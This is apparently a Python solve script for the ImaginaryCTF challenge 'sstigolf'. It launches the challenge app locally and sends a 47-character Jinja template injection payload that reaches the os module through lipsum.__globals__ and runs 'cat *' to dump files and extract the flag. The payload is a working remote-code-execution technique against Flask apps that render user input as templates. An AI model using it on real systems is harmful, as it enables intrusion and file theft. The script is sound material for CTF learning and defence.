#!/usr/bin/env python3
"""Solve ImaginaryCTF `sstigolf` -- 48-char SSTI, no blacklist.

Recon: `/ssti?query=...` renders your input with `render_template_string`, the
only rule being `len(query) <= 48`. No character blacklist this time.

Clue: with `{{ }}` allowed we can render output directly -- no out-of-band
needed. Reach os through a Jinja global that has `__globals__`
(`lipsum` is the shortest: `lipsum.__globals__.os`). The flag lives in an
oddly named file, so `cat *` dumps every file in the app dir and we grep the
flag out of the rendered page. Total payload: 47 chars.

Runs entirely LOCALLY against 127.0.0.1.

Fetch first:  python challenges/fetch.py sstigolf
"""
import os
import re
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
APP = os.path.join(REPO, "challenges", "sstigolf", "challenge", "app")
PAYLOAD = '{{lipsum.__globals__.os.popen("cat *").read()}}'  # 47 chars


def main() -> None:
    srv = subprocess.Popen(
        [sys.executable, "app.py"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=APP,
    )
    try:
        time.sleep(2)
        assert len(PAYLOAD) <= 48, "payload too long"
        r = requests.get(
            "http://127.0.0.1:1337/ssti", params={"query": PAYLOAD}, timeout=5
        )
        match = re.search(r"ictf\{[^}]*\}", r.text)
        print("FLAG:", match.group(0) if match else "not found")
    finally:
        srv.terminate()
        srv.wait()


if __name__ == "__main__":
    main()
